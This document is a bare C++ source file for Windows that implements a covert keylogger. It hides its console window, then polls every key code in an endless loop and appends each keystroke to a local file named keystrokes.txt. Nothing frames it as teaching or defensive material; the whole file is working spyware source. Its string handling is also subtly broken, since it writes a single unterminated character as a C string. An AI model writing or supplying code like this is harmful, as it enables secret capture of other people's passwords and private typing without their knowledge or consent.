#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

void logKeyPress(const char* key) {
    std::ofstream logfile("keystrokes.txt", std::ios::app);
    if(*key >=21 && *key<=255)
   	 logfile << key;
    logfile.close();

}

int main() {
    // Hide the console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true) {
        for (int i = 8; i <= 255; ++i) {
            if (GetAsyncKeyState(i) == -32767) {
                char key = static_cast<char>(i);
                logKeyPress(&key);
            }
        }
    }

    return 0;
}

